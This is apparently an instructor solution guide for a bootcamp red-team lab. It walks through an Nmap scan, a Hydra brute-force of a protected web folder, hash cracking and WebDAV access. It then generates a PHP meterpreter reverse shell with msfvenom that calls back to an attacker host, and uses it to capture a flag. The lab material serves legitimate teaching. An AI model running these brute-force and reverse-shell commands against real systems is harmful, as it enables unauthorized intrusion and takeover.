## Day 1 Solution Guide: Red Team

This solution guide should only be used to help students if they get stuck. Before helping students, remind them that penetration testing is usually done in teams that collaborate with one another.

If students are still struggling or stuck, consult the following guides and offer assistance.

While going through the solution file, please note that the IP addresses here need to be replaced your machine's IP addresses. 
  
### Step 1: Discover the IP address of the Linux server.

In order to find the IP address of the machine, you will need to use Nmap to scan your network.

- Open the terminal and run: `nmap 192.168.1.0/24`

   ![1_nmap.png](Images/nmap_scan_192_168_1_0_24.png)

From the Nmap scan we can see that port `80` is open. Open a web browser and type the IP address of the machine into the address bar.

- Open a web browser and navigate to `192.168.1.105` and press `enter`.

   ![2_web_discovery.png](Images/index_of_192_168_1_105.png)

### Step 2: Locate the hidden directory on the server.

- Navigate to the directory by typing: `192.168.1.105/company_folders/secret_folder`

- The directory asks for authentication in order to access it. Reading the authentication method, it says "For ashton's eyes only."

    ![4_password_protect.png](Images/company_folders_secret_folder_message.png)

    ![ashtons_eyes](Images/ashtons_eyes_only_login.png)

    

### Step 3: Brute force the password for the hidden directory.

Because the folder is password protected, we need to either guess the password or brute force into the directory. In this case, it would be much more efficient to use a brute force attack, specifically Hydra.

- Using Ashton's name, run the Hydra attack against the directory:
    
  - Type: `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`

      ![5_hydra_sytanx.png](Images/hydra_ashton_password.png)

- The brute force attack may take some time. Once it finishes, you'll find the username is `ashton` and the password is `leopoldo`.

- Go back to the web browser and use the credentials to log in. Click the file `connecting_to_webdav`.

   ![ashtons_login](Images/ashton_login_secret_folder.png)

- Located inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.

   ![webdav_instructions.png](Images/connect_to_corp_server_folder.png)
   
**Step 4: Connect to the server via Webdav**

There are several ways to break the password hash. Here, we simply used Crack Station, to avoid waiting for `john` to crack the password.

Navigate to `https://crackstation.net`; paste the password hash and fill out the CAPTCHA; and click **Crack Hashes**.

   ![webdav_hash.png](Images/cracked_ryan_password.png)

  - The password is revealed as: `linux4u`

### Step 5: Connect to the server via WebDAV.

This may be the most difficult part of the Red Team exercise, as it will require students to do external research on how to connect to the VM's WebDAV directory.

In addition, the instructions show an outdated IP address that the students will need to change to the IP address they discovered.

- In order to do so, students will already need to have the user name and following instructions from the `secret_folder`. Direct students to:
  - Open the `File System` shortcut from the desktop.
  - Click `Browse Network`.
  - In the URL bar, type: `dav://192.168.1.105/webdav`, and enter the credentials to log in.

    ![10_connect_to_webdav.png](Images/webdav_login.png)

### Step 6: Upload a PHP reverse shell payload.

- To set up the reverse shell, run:

  - `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`

   ![11_msfvenom.png](Images/msfvenom_php_reverse_shell_payload.png)

- Run this series of commands to set up a listener:

  - `msfconsole` to launch `msfconsole`.
  - `use exploit/multi/handler`
  - `set payload php/meterpreter/reverse_tcp`
  - `show options` and point out they need to set the `LHOST`.
  - `set LHOST 192.168.1.90`
  - `exploit`

    ![12_listener.png](Images/meterpreter_exploit_payload.png)

- Place the reverse shell onto the WebdDAV directory.

    ![13_implanting_the_reverse.png](Images/webdav_php_payload.png)

- Now that you're logged in, connect to the webdav folder by navigating to `192.168.1.105/webdav`. Use the credentials that you used before, `user:ryan pass:linux4u`.

  ![14_webdav.png](Images/ryan_login_webdav_browser.png)

- Navigate to where you first uploaded the reverse shell and click it to activate it. If it seems like the browser is hanging or loading, that means it has worked.
    - If it asks you if you'd like to save or open the PDF file, start again at the beginning of Step 5.

  ![15_activiating_the_shell.png](Images/webdav_directory_contents.png)

### Step 7: Find and capture the flag.

- On the listener, search for the file `flag.txt` located in the `root` directory. Students can use many techniques they have learned in order to find it.

- On the listener, search for the file `flag.txt` located in the root directory. Students can use many techniques they have learned to find it. One technique is to run:

  - Drop into a bash shell with the command: `shell`
  - Go to the `/` directory: `cd /`
  - Run the command `ls` to see contents of directory
  - Search the system for any files containing the phrase "flag" : `find . -iname flag.txt`

- Read the file, once located, with `cat`.

   ![16_view_files](Images/meterpreter_shell_flag.png)


---
© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
